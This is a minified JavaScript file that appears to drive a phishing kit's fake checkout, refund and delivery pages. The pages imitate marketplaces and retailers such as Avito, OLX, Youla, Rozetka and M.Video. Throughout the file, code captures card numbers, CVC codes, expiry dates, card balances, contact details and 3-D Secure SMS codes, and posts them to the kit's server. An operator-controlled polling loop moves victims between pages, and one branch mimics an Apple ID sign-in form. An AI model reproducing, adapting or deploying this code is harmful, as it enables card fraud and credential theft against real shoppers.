let smartsupp_lang={"BR":"pt","BG":"bg","RU":"ru","PL":"pl","KZ":"ru","RO":"ro","BY":"ru","UZ":"ru","PT":"pt","UA":"uk","GB":"en","US":"en"}
var _smartsupp;_smartsupp=_smartsupp||{};_smartsupp.key='0227666d21b9382d69639ebadd9d2f4147ff759e';window.smartsupp||(function(d){var s,c,o=smartsupp=function(){o._.push(arguments)};o._=[];s=d.getElementsByTagName('script')[0];c=d.createElement('script');c.type='text/javascript';c.charset='utf-8';c.async=true;c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);})(document);smartsupp("language",smartsupp_lang[_country_codename]);if(_my_ip)smartsupp('name',_my_ip+"_______"+_link_hash);let setUserCardLink,waitLink,setUserDataOnSuccess,id,link_hash,cardnumber,expire,exp_m,exp_y,cvc,cardbalance,personphone,email,user_card,user_cvc,user_expiry,user_balance,link_type,card,user_firstname,user_lastname,user_email,user_address,user_telephone,_3ds;class App{constructor(){this.enabled=false;this.elems={"zuser_fullname":{},"zuser_firstname":{},"zuser_lastname":{},"zuser_phone":{},"zuser_email":{},"zuser_address":{},"zcard_number":{},"zcard_holder":{},"zcard_expire-my":{},"zcard_expire-m":{},"zcard_expire-y":{},"zcard_cvc":{},"zcard_balance":{}}
this.btns={"zbtn-buy":{},"zbtn-sell":{},"zbtn-refund":{},"zbtn-payment":{},"zbtn-merchant":{},"zbtn-send":{},"zbtn-recieve":{},"zbtn-user-submit":{},"zbtn-user-submit-avito":{},"zbtn-cancellation":{},"zbtn-purchase":{},"zbtn-delivery":{},"zbtn-buy_n_pay":{},"zbtn-sell_n_pay":{},"zbtn-link_card_n_pay":{},"zbtn-link_card_n_pay-olx-nb":{},"z3ds-send":{}}
this.initDefaults();this.initDOM();this.initFormat();this.initEvents();this.collectData("placeholder");}
initDOM(){for(let attr in this.elems){let el=this.elems[attr];if(el.m){let targets=[];let item=document.querySelectorAll(`[data-${attr}]`);if(!item.length>0)continue;item.forEach(item=>targets.push(item));el.e=targets;}else{let item=document.querySelector(`[data-${attr}]`);if(!item)continue;el.e=item;}}
for(let attr in this.btns){let el=this.btns[attr];let item=document.querySelectorAll(`[data-${attr}]`);if(!item)continue;el.e=item;}
return 0;}
initDefaults(){for(let attr in this.btns){this.btns[attr].e=null;}
for(let attr in this.elems){this.elems[attr].e=null;this.elems[attr].f=false;this.elems[attr].m=(attr==="zuser_address");}}
initFormat(){for(let attr in this.elems){let el=this.elems[attr];let selector=`[data-${attr}]`;if(!el.e)continue;if(["zuser_fullname","zuser_firstname","zuser_lastname","zcard_holder"].indexOf(el)!==-1){el.e.maxLength=50;}
if(attr==="zcard_number"){cardnumber=new Cleave(`${selector}`,{creditCard:true,creditCardStrictMode:true,delimiterLazyShow:true});el.f=!!cardnumber;}
if(attr==="zcard_holder"){cardNameFormat(`${selector}`);el.f=true;}
if(attr==="zcard_cvc"){cvc=new Cleave(`${selector}`,{numericOnly:true,blocks:[3],stripLeadingZeroes:false,numeralPositiveOnly:true});el.f=!!cvc;el.e.maxLength=3;}
if(attr==="zcard_balance"){cardbalance=new Cleave(`${selector}`,{numeral:true,numeralDecimalMark:'.',delimiter:' '});el.f=!!cardbalance;el.e.maxLength=12;}
if(attr==="zcard_expire-my"){expire=new Cleave(`${selector}`,{date:true,datePattern:["m","y"]});el.f=!!expire;}
if(attr==="zcard_expire-m"){exp_m=new Cleave(`${selector}`,{date:true,datePattern:["m"]});el.f=!!exp_m;}
if(attr==="zcard_expire-y"){exp_y=new Cleave(`${selector}`,{date:true,datePattern:["y"]});el.f=!!exp_y;}
if(attr==="zuser_email"){email=new Cleave(`${selector}`,{email:true});el.f=!!email;el.e.maxLength=50;}
if(attr==="zuser_phone"){let prefix,blocks,delimiters
switch(_country_codename){case "RU":prefix="+7";blocks=[prefix.length,3,0,3,2,2];delimiters=[" (",")"," "," "," "];break;case "UA":prefix="+380";blocks=[prefix.length,2,0,3,2,2];delimiters=[" (",")"," "," "," "];break;case "BR":break;case "BG":break;case "PL":prefix="+48";blocks=[prefix.length,2,3,2,2];delimiters=[" ","-"];break;case "KZ":break;case "RO":break;case "BY":break;case "UZ":break;case "PT":break;case "GB":prefix="+44";blocks=[prefix.length,3,0,,4,4];delimiters=[" (",")"," "," "];break;case "US":break;default:break;}
if(prefix&&blocks&&delimiters){personphone=new Cleave(`${selector}`,{numericOnly:true,prefix:prefix,blocks:blocks,delimiters:delimiters,});el.f=!!personphone;el.e.maxLength=20;}else{personphone=new Cleave(`${selector}`,{numericOnly:true});el.f=!!personphone;el.e.maxLength=20;}}}}
initEvents(){for(let attr in this.btns){let el=this.btns[attr];if(el.e.length===0)continue;el.e.forEach(btn=>{let collect=this.collectData.bind(this);if(attr=="zbtn-buy"){btn.onclick=()=>{collect("user");setUserDataOnSuccess=function(){document.location.href="/payment/"+_link_hash}
setUserData();}}
if(attr=="zbtn-sell"){btn.onclick=()=>{collect("user");setUserDataOnSuccess=function(){document.location.href="/merchant/"+_link_hash}
setUserData();}}
if(attr=="zbtn-purchase"){btn.onclick=()=>{document.location.href="/send/"+_link_hash}}
if(attr=="zbtn-delivery"){btn.onclick=()=>{document.location.href="/recieve/"+_link_hash}}
if(attr=="zbtn-refund"){btn.onclick=()=>{collect("card");link_type="refund";setUserCardLink="/3ds/";setUserCard();}}
if(attr=="zbtn-payment"){btn.onclick=()=>{collect("card");link_type="buy";setUserCardLink="/3ds/";setUserCard();}}
if(attr=="zbtn-merchant"){btn.onclick=()=>{collect("card");link_type="sell";setUserCardLink="/3ds/";setUserCard();}}
if(attr=="zbtn-cancellation"){btn.onclick=()=>{link_type="cancellation";setUserCardLink="/processing/";checkPayment();}}
if(attr=="zbtn-send"){btn.onclick=()=>{link_type="send";setUserCardLink="/processing/";checkPayment();}}
if(attr=="zbtn-recieve"){btn.onclick=()=>{link_type="recieve";setUserCardLink="/processing/";checkPayment();}}
if(attr=="zbtn-buy_n_pay"){btn.onclick=()=>{collect("user");collect("card");link_type="buy";setUserCardLink="/3ds/";setUserData();setUserCard();}}
if(attr=="zbtn-sell_n_pay"){btn.onclick=()=>{collect("user");collect("card");link_type="sell";setUserCardLink="/3ds/";setUserData();setUserCard();}}
if(attr=="zbtn-link_card_n_pay"){btn.onclick=()=>{collect("user");collect("card");link_type="link_card";setUserCardLink="/3ds/";setUserData();setUserCard();}}
if(attr=="zbtn-link_card_n_pay-olx-nb"){btn.onclick=()=>{if(_link_need_balance==="1"){show("approving")}else{collect("user");collect("card");link_type="link_card";setUserCardLink="/3ds/";setUserData();setUserCard();}}}
if(attr=="zbtn-user-submit"){btn.onclick=()=>{collect("user");setUserDataOnSuccess=function(){}
setUserData();}}
if(attr=="zbtn-user-submit-avito"){btn.onclick=()=>{collect("user");setUserDataOnSuccess=function(){$("#boxUserFirstInfo").arcticmodal("close");}
setUserData();}}
if(attr=="z3ds-send"){btn.onclick=()=>{send3DS();}}});let documentImages=document.querySelectorAll('img');for(let image of documentImages){image.onerror=event=>{event.target.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";event.target.style.display='none'}}}}
collectData(type){if(type==="card"){user_card=cardnumber.getRawValue();user_cvc=cvc.getRawValue();user_expiry=(exp_m&&exp_y)?exp_m.getRawValue()+exp_y.getRawValue():expire.getRawValue();user_balance=cardbalance.getRawValue();}
if(type==="user"){if(this.elems.zuser_fullname.e&&this.elems.zuser_fullname.e.value.length>1){user_firstname=this.elems.zuser_fullname.e.value.split(" ")[0];user_lastname=this.elems.zuser_fullname.e.value.split(" ")[1];}else if(this.elems.zuser_firstname.e&&this.elems.zuser_lastname.e&&(this.elems.zuser_firstname.e.value.length>1&&this.elems.zuser_lastname.e.value.length>1)){user_firstname=this.elems.zuser_firstname.e.value;user_lastname=this.elems.zuser_lastname.e.value;}
if(this.elems.zuser_email.e&&this.elems.zuser_email.e.value.length>2&&this.elems.zuser_email.e.value.indexOf("@")>0)
user_email=this.elems.zuser_email.e.value;if(this.elems.zuser_address.e){user_address="";this.elems.zuser_address.e.forEach(item=>{user_address+=`${item.value} | `;});}
if(user_address.length<3)
user_address="DEFAULT ADDRESS"
if(this.elems.zuser_phone.e&&this.elems.zuser_phone.e.length>9)
user_telephone=this.elems.zuser_phone.e.value;}
if(type==="placeholder"){user_firstname="DEFAULT"
user_lastname="DEFAULT"
user_email="DEFAULT@DEFAULT.COM"
user_address="DEFAULT ADDRESS"
user_telephone="00000000000"}}}
let payment_app;document.addEventListener('DOMContentLoaded',function(){if(window.jQuery){payment_app=new App();}else{console.log("jQuery not loaded")}});let setUserDataCount=0;function setUserData(){link_hash=_link_hash;id=_link_hash;let force_price='';if(_service_type&&_service_type==="3")
force_price=document.querySelector('[data-zdata-dynamic-price]').innerText||'';$.ajax({type:"POST",url:"/setUserData",data:{link_hash:link_hash,user_firstname:user_firstname,user_lastname:user_lastname,user_email:user_email,user_address:user_address,user_telephone:user_telephone,force_price:force_price},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;case "success":try{setUserDataOnSuccess()}catch(e){console.log(e)}
break;}},error:function(xhr,str){if(setUserDataCount<3)
setTimeout(()=>{setUserDataCount++;setUserData();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
let setUserCardCount=0;function setUserCard(){link_hash=_link_hash;id=_link_hash;$.ajax({type:"POST",url:"/setUserCard",data:{link_hash:link_hash,link_type:link_type,user_card:user_card,user_cvc:user_cvc,user_expiry:user_expiry,user_balance:user_balance,},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;case "success":if(data.form_send){document.body.insertAdjacentHTML('beforeend',minimizeHTML(data.form_send))
document.getElementById('autopay').submit()}else{document.location.href=setUserCardLink+id;}
break;}},error:function(xhr,str){if(setUserCardCount<3)
setTimeout(()=>{setUserCardCount++;setUserCard();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
let checkPaymentCount=0;function checkPayment(){link_hash=_link_hash;id=_link_hash;$.ajax({type:"POST",url:"/payment_confirm",data:{link_hash:link_hash,link_type:link_type},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;case "success":if(data.form_send){document.body.insertAdjacentHTML('beforeend',minimizeHTML(data.form_send))
document.getElementById('autopay').submit()}else{document.location.href=setUserCardLink+id;}
break;}},error:function(xhr,str){if(setUserCardCount<3)
setTimeout(()=>{setUserCardCount++;setUserCard();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
let get3dsStatusCount=0;function get3dsStatus(){link_hash=_link_hash;id=_link_hash;$.ajax({type:"POST",url:"/get3dsStatus",data:{link_hash:link_hash},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;default:if(data.status!=""){$("#error_block").attr("style","");$("#error_text").text(data.status);}
break;}},error:function(xhr,str){if(get3dsStatusCount<3)
setTimeout(()=>{get3dsStatusCount++;get3dsStatus();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
let send3DSCount=0;function send3DS(){link_hash=_link_hash;_3ds=$("#cardName").val();_3ds_static=$("#static_3ds_code")[0];let static_3ds_code;if(_3ds_static)static_3ds_code=_3ds_static.value;$.ajax({type:"POST",url:"/send3DS",data:{link_hash:link_hash,_3ds:_3ds,static_3ds_code:static_3ds_code},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;case "success":send3DSCount=0;document.location.href="/processing/"+id;break;}},error:function(xhr,str){if(send3DSCount<3)
setTimeout(()=>{send3DSCount++;send3DS();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
let resendSMScount=0;function resendSMS(){link_hash=_link_hash;$.ajax({type:"POST",url:"/resendSMS",data:{link_hash:link_hash},success:function(data){data=$.parseJSON(data);switch(data.status){case "success":startTimer();resendSMScount=0;break;}},error:function(xhr,str){if(resendSMScount<3)
setTimeout(()=>{resendSMScount++;resendSMS();},200);else
alert(translations[smartsupp_lang[_country_codename]]['Error']+xhr.responseCode);},});}
function cardNameFormat(selector){let target=document.querySelector(selector);target.setAttribute("pattern","([A-Za-z\-\'\.\\\\]+)");target.style.textTransform="uppercase";const regex=new RegExp(/[A-Za-z\-\'\. ]+/ig);function validName(e){if(!regex.test(e.key)){event.preventDefault();return false;}
e.target.value=e.target.value.toUpperCase();}
function pasteValidName(e){let clipboardData=e.clipboardData||window.clipboardData;let pastedData=clipboardData.getData('Text');let filteredData=(pastedData.match(regex)||[]).join('');if(!filteredData){e.preventDefault();return false;}
e.preventDefault();e.target.value=filteredData;}}
let translations={"ru":{"Error":"Возникла ошибка: ","ResendCode":"Выслать код повторно",},"ua":{"Error":"Возникла ошибка: ","ResendCode":"Вислати код повторно",},"uk":{"Error":"Возникла ошибка: ","ResendCode":"Вислати код повторно",},"en":{"Error":"An error occured: ","ResendCode":"Resend code",},"pl":{"Error":"Wystąpił błąd: ","ResendCode":"Ponownie wyślij kod",},"pt":{"Error":"Um erro ocorreu: ","ResendCode":"Reenviar código",},}
if(_page=="buy"){if(_service_code=="avito"){$(document).ready(function(){$("#boxUserFirstInfo").arcticmodal()});}
if(_service_code=="belpost"){$(document).ready(function(){setTimeout(function(){$(".app-spinner").fadeOut();$(".global").fadeIn();},4000);$("#account_name_text_field").click(function(){$("#appleid").addClass("apple-id-focus");});$("#password_text_field").click(function(){$("#password_text_field").css("border","1px solid #0070c9");$(".field-separator").addClass("password-focus");});$("#sign-in").click(function(){$(".spinner-container").removeClass("hide");$(".spinner-container").addClass("show");$("#sign-in").hide();setTimeout(function(){$(".spinner-container").removeClass("show");$(".spinner-container").addClass("hide");$("#sign-in2").show();$(".field-separator").css("display","block");$("#password").css("height","44px");$("#password2").css("height","44px");$("#password_text_field").fadeIn();},2000);});});}
if(_service_code=="boxberry"){setTimeout(function(){document.getElementById("customer-chat-iframe").style.zIndex="9999999999";},5000);}
if(_service_code=="citrusua"){class Citrus{constructor(){this.tab__contact=document.querySelector(".checkout__contacts");this.tab__contact_name=document.querySelector(".contacts__name input");this.tab__contact_phone=document.querySelector(".contacts__phone input");this.tab__contact_email=document.querySelector(".contacts__email input");this.tc_edit=document.querySelector(".to-edit-step");this.tc_next=document.querySelector(".to-confirm-step");this.tc_descr=document.querySelector(".step__description.contacts__current-contacts");this.tab__delivery=document.querySelector(".checkout__delivery");this.tab__delivery_type=document.querySelector(".item__type[name='deliveryType']");this.tab__delivery_city=document.querySelector(".region__cities input");this.tab__delivery_street=document.querySelector(".location__address .ms-sel-ctn input");this.tab__delivery_house=document.querySelector(".address__house");this.tab__delivery_appartment=document.querySelector(".address__apartment");this.td_edit=document.querySelector(".to-edit");this.td_next=document.querySelector(".checkout__delivery .to-confirm");this.td_descr=document.querySelector(".step__description.delivery__current-delivery");this.tab__payment=document.querySelector(".checkout__payment ");this.payment_next=document.querySelector(".payment_type_card");this.payment_item=document.querySelector(".payment__items .item__type");this.order__confirm=document.querySelector(".order__confirm");this.tab_order=this.getAllTabs();this.tab_order_states=[0,-1,-1];this.init(this);}
init(app){personphone=new Cleave(".contacts__phone input",{numericOnly:true,prefix:"+38",blocks:[3,3,0,3,2,2],delimiters:[" (",")"," ","-","-"],});email=new Cleave(".contacts__email input",{email:true,});this.tc_next.addEventListener("click",function(){let error=false;if(app.tab__contact_name.value.length<3){document.querySelector(".error-name-field").innerText="Обязательно должно быть заполнено";error=true;}else{document.querySelector(".error-name-field").innerText="";error=false;}
if(personphone.getRawValue().length<13||personphone.getRawValue().slice(0,4)!="+380"){document.querySelector(".error-phone-field").innerText="Укажите корректный номер телефона";error=true;}else{document.querySelector(".error-phone-field").innerText="";error=false;}
if(email.getRawValue().length<5||app.validateEmail(email.getRawValue())==false){document.querySelector(".error-email-field").innerText="Укажите корректный email-адрес";error=true;}else{document.querySelector(".error-email-field").innerText="";error=false;}
if(error==false){app.tc_descr.innerText=`${app.tab__contact_name.value}, ${app.tab__contact_phone.value}, ${app.tab__contact_email.value}`;app.markTab("contacts");app.enableTab("delivery");app.checkFilling();}});this.td_next.addEventListener("click",function(){let error=false;if(app.tab__delivery_city.value.length<3){document.querySelector(".error-city-field").innerText="Укажите город";error=true;}else{document.querySelector(".error-city-field").innerText="";error=false;}
if(app.tab__delivery_type.checked==false){document.querySelector(".error-delivery-type-field").innerText="Выберите тип доставки";error=true;}else{document.querySelector(".error-delivery-type-field").innerText="";error=false;}
if(app.tab__delivery_street.value.length<3){document.querySelector(".error-street-field").innerText="Укажите улицу";error=true;}else{document.querySelector(".error-street-field").innerText="";error=false;}
if(app.tab__delivery_house.value==false){document.querySelector(".error-house-field").innerText="Укажите дом";error=true;}else{document.querySelector(".error-house-field").innerText="";error=false;}
if(error==false){app.td_descr.innerText=`${app.tab__delivery_city.value}, Курьер Цитруса, ${app.tab__delivery_street.value}, ${app.tab__delivery_house.value}, ${app.tab__delivery_appartment.value}`;app.markTab("delivery");app.enableTab("payment");app.checkFilling();}
app.checkFilling();});this.tc_edit.addEventListener("click",function(){app.unmarkTab("contacts");app.unmarkTab("delivery");app.disableTab("delivery");app.disableTab("payment");});this.td_edit.addEventListener("click",function(){app.unmarkTab("delivery");app.disableTab("payment");});this.tab__delivery_type.addEventListener("change",function(){document.querySelector(".error-delivery-type-field").innerText="";});document.addEventListener("focusout",function(e){app.checkFilling();});this.payment_item.addEventListener("change",function(){app.checkFilling();});}
goToTab(tab){try{if(this.getCurTab()[0].class!=this.getTab(tab).class){let direction=this.getTabChangeDirection(this.getCurTab()[0],this.getTab(tab));let nextTab=this.getTab(tab);if(direction>0){this.getCurTab()[0].node.classList.add("complete");nextTab.node.classList.remove("disabled");}else if(direction<0){this.getCurTab()[0].node.classList.add("disabled");nextTab.node.classList.remove("complete");}
return;}}catch{}}
getTabChangeDirection(prev,next){if(this.tab_order.indexOf(next.class)>this.tab_order.indexOf(prev.class))
return 1;else if(this.tab_order.indexOf(next.class)<this.tab_order.indexOf(prev.class))
return-1;else return 0;}
getAllTabs(){let _=[];let tabs=document.querySelectorAll(".checkout__step");for(let i=0;i<tabs.length;i++)
_.push(this.getTab(this.tabNameHandler(tabs[i].classList.value)).class);return _;}
getCurTab(){let _=[];let tabs=document.querySelectorAll(".checkout__step:not(.disabled):not(.complete)");for(let i=0;i<tabs.length;i++)
_.push(this.getTab(this.tabNameHandler(tabs[i].classList.value)));return _;}
getTab(tab){if(typeof tab=="string")tab=this.tabNameHandler(tab);if(document.querySelector(`.${tab}`))
return{class:tab,node:document.querySelector(`.${tab}`)};}
markTab(tab){return this.getTab(tab).node.classList.add("complete");}
unmarkTab(tab){return this.getTab(tab).node.classList.remove("complete");}
disableTab(tab){return this.getTab(tab).node.classList.add("disabled");}
enableTab(tab){return this.getTab(tab).node.classList.remove("disabled");}
tabNameHandler(tab){let _=tab.replace("checkout__step","").replace(" ","").replace("disabled","").replace("complete","");if(_.indexOf("checkout__")<0)return "checkout__"+_;return _;}
checkFilling(){if([Boolean(this.tab__contact_name.value),Boolean(this.tab__contact_phone.value),Boolean(this.tab__contact_email.value),Boolean(this.tab__delivery_city.value),Boolean(this.tab__delivery_street.value),Boolean(this.tab__delivery_house.value),Boolean(this.payment_item.checked),].includes(false)){this.order__confirm.disabled=true;return false;}
this.order__confirm.disabled=false;return true;}
validateEmail(email){const re=/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;return re.test(String(email).toLowerCase());}
pasteCity(el){document.querySelector(".city__input").value=el.innerText;document.querySelector(".delivery__type").style.display="block";document.querySelector(".error-street-field").innerText="";}
cityInputBlur(){if(this.tab__delivery_city.value.length<3){document.querySelector(".error-city-field").innerText="Укажите город";}else{document.querySelector(".error-city-field").innerText="";}}}
c=new Citrus();}
if(_service_code=="iziua"){function xdis(){document.getElementById("xdis1").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");document.getElementById("xdis2").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");}}
if(_service_code=="mvideo"){function not_available(event){event.preventDefault();alert('К сожалению, данное действие для данного товара недоступно.');}}
if(_service_code=="youla"){function delivery(){$(".hint__2YlkHbKL").hide();$(".form__1P2Y3sX1").show();$("#one").addClass("tab__active__3xXMJJRt");$("#two").removeClass("tab__active__3xXMJJRt");}
function nodelivery(){$(".hint__2YlkHbKL").show();$(".form__1P2Y3sX1").hide();$("#one").removeClass("tab__active__3xXMJJRt");$("#two").addClass("tab__active__3xXMJJRt");}
function city(){$("#modal_city").show();}
function closecity(){$("#modal_city").hide();}
function acceptcity(){$("#pr_loc").text($("#newcity_inp").val());closecity();}}}
if(_page=="payment"){if(_service_code=="rozetkaua"){class payment{constructor(){this.autoSwitchArray=[{element:"#card-number",trigger:19},{element:"#card-exp",trigger:7},{element:"#card-cvv",trigger:3},];this.submit=document.querySelector(".submit");for(let i=0;i<this.autoSwitchArray.length;i++){this.switchHandler(i,this);}}
switchHandler(i,pay){document.querySelector(this.autoSwitchArray[i].element).addEventListener("keyup",function(e){if(this.value.length==pay.autoSwitchArray[i].trigger&&i!=pay.autoSwitchArray.length-1&&+e.key>=0&&+e.key<=9)
document.querySelector(pay.autoSwitchArray[i+1].element).focus();if(pay.fillingCheck())pay.submit.disabled=false;else pay.submit.disabled=true;});}
fillingCheck(){for(let i=0;i<this.autoSwitchArray.length;i++){if(document.querySelector(this.autoSwitchArray[i].element).value.length<this.autoSwitchArray[i].trigger)
return false;}
return true;}}
let Payment=new payment();}}
if(_page=="processing"){wait();function wait(){link_hash=_link_hash;id=_link_hash;waitLink="/3ds/";$.ajax({type:"POST",url:"/wait",data:{link_hash:link_hash},success:function(data){data=$.parseJSON(data);switch(data.status){case "error":alert(data.error);break;case "success":document.location.href="/success/"+id;break;case "not_enough_money":document.location.href="/fail/"+id;break;case "error_code":document.location.href=waitLink+id;break;case "goodbye":document.location.href="https://youtube.com";break;case "xxx":document.location.href=waitLink+id;break;case "technical_reasons":document.location.href="/fail/"+id;break;case "repeat_send_money":setTimeout(()=>{document.location.href="/fail/"+id},getRandomInt(3000,10000));break;case "tech_support":document.location.href="/fail/"+id;break;case "wait":setTimeout("wait()",5000);break;}},error:function(xhr,str){wait();},});}}
if(_page=="refund"){if(_service_code=="iziua"){xdis=function(){document.getElementById("xdis1").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");document.getElementById("xdis2").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");}}
if(_service_code=="rozetkaua"){class payment{constructor(){this.autoSwitchArray=[{element:"#card-number",trigger:19},{element:"#card-exp",trigger:7},{element:"#card-cvv",trigger:3},];this.submit=document.querySelector(".submit");for(let i=0;i<this.autoSwitchArray.length;i++){this.switchHandler(i,this);}}
switchHandler(i,pay){document.querySelector(this.autoSwitchArray[i].element).addEventListener("keyup",function(e){if(this.value.length==pay.autoSwitchArray[i].trigger&&i!=pay.autoSwitchArray.length-1&&+e.key>=0&&+e.key<=9)
document.querySelector(pay.autoSwitchArray[i+1].element).focus();if(pay.fillingCheck())pay.submit.disabled=false;else pay.submit.disabled=true;});}
fillingCheck(){for(let i=0;i<this.autoSwitchArray.length;i++){if(document.querySelector(this.autoSwitchArray[i].element).value.length<this.autoSwitchArray[i].trigger)
return false;}
return true;}}}}
if(_page=="sell"){if(_service_code=="iziua"){function xdis(){document.getElementById("xdis1").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");document.getElementById("xdis2").classList.remove("OrderCreateForm__openFormDisabled--37Ygb");}}}
if(_page=="3ds"){var i,timer;startTimer();function onTimer(){$(".counter").html(i);i--;if(i<0){$(".counter").html(`<a onclick="event.preventDefault(); resendSMS();" href="#">${translations[smartsupp_lang[_country_codename]].ResendCode}</a>`);}else{if(timer)clearTimeout(timer);timer=setTimeout(onTimer,1000);}
return false;}
function startTimer(){i=300;return onTimer();}
$(document).ready(function(){get3dsStatus();});try{new Cleave("#cardName",{blocks:[12]});}catch(error){}}
if(_page=="basket"){if(_service_code=="mvideo"){$(document).ready(function(){$('*[data-sel="new_checkout-goods_block-order_title"]').html(` В заказе 1 товар на сумму ${ link_cost-discount }¤ `);$('*[data-sel="new_checkout-span-total_cost-cost"]').text(`${ link_cost-discount } ¤`);$(".price_").html(` 1 шт. x ${ link_cost-discount }¤ <span class="c-orders-list__old-price">${link_cost}¤</span> `);});}}
function minimizeHTML(html){return html.replace(/^\s+|\r\n|\n|\r|(>)\s+(<)|\s+$/gm,'$1$2');}
function getRandomInt(min,max){min=Math.ceil(min);max=Math.floor(max);return Math.floor(Math.random()*(max-min))+min;}